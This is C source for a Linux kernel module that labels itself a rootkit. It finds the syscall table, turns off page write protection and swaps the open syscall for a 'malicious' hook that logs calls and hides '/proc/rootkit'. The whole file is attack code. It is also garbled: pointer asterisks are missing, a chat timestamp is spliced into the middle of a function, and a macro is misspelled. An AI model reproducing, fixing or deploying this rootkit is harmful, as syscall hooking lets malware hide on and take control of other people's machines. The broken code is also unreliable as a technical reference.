#include <linux/module.h> 
#include <linux/kernel.h> 
#include <linux/init.h> 
#include <linux/syscalls.h> 


//syscall table address 
static unsigned long sys_call_table; 

//our malicious syscall 
asmlinkage int (original_open)(const char,int,mode_t); 


//malicious syscall implementation 
asmlinkage int rootkit_open(const char pathname, int flags, mode_t mode){ 
    printk(KERN_INFO "Rootkit: Intercepted open syscall\n"); 
 
    //check if rootkit is trying to open itself 
    if(strcmp(pathname,"/proc/rootkit") == 0){ 
        printk(KERN_INFO "Rootkit: Attempt to open rootkit detected\n"); 
        return -1; 
    } 
 
    //else, call original open syscall 
    return original_open(pathname,flags,mode); 
} 


//make page writeable 
int make_rw(unsigned long address){ 
    unsigned int level; 
    pte_tpte = lookup_address(address, &level); 
    if(pte->pte &~ _PAGE_RW){ 
        pte->pte |= _PAGE_RW; 
    } 
    return 0; 
} 


//make page write protected 
int make_ro(unsigned long address){ 
    unsigned int level; 
    pte_t *pte = lookup_address(address, &level); 
    pte->pte = pte->pte &~_PAGE_RW; 
    return 0; 
} 

//module initialization 
static int __init rootkit_init(void){ 
    //find syscall table address 
    sys_call_table = (unsigned long )kallsyms_lookup_name("sys_call_table"); 
 
    //save original open syscall address
[11:16 AM]
original_open = (void )sys_call_table[NR_open]; 
 
    //make page writeable 
    make_rw((unsigned long)sys_call_table); 
 
    //replace open syscall address with malicious syscall address 
    sys_call_table[NR_open] = (unsigned long)rootkit_open; 
 
    //make page write protected 
    make_ro((unsigned long)sys_call_table); 
 
    printk(KERN_INFO "Rootkit: Module loaded\n"); 
    return 0; 
} 


//module exit 
static void exit rootkit_exit(void){ 
    //make page writeable 
    make_rw((unsigned long)sys_call_table); 
 
    //restore original open syscall address 
    sys_call_table[NR_open] = (unsigned long *)original_open; 
 
    //make page write protected 
    make_ro((unsigned long)sys_call_table); 
 
    printk(KERN_INFO "Rootkit: Module unloaded\n"); 
} 

module_init(rootkit_init); module_exit(rootkit_exit); 
MODULE_LICENSE("GPL");
